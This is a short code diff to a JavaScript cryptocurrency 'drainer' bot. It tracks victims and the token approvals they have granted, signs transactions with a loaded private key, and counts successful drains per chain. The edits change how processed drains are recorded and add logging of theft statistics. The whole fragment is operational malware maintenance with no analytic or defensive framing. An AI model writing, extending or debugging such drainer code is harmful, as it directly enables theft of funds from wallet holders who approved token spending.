@@ -30,7 +30,7 @@ const account = privateKeyToAccount(PRIVATE_KEY);
 
 // Track victims and their approved tokens
 const trackedVictims = new Map(); // { victimAddress: Set<tokenAddress> }
-const processedDrains = new Set();
+const processedDrains = new Map(); // { drainId: timestamp }
 
 let stats = {
   totalDrained: 0,
@@ -147,6 +147,8 @@ async function monitorChain(config) {
                   stats.totalDrained++;
                   stats.lastDrain = new Date().toISOString();
                   stats.drainsByChain[chain.name] = (stats.drainsByChain[chain.name] || 0) + 1;
+                  
+                  console.log(`📊 Stats updated:`, JSON.stringify(stats));
                 } else {
                   console.log(`❌ TX reverted: ${hash}`);
                 }
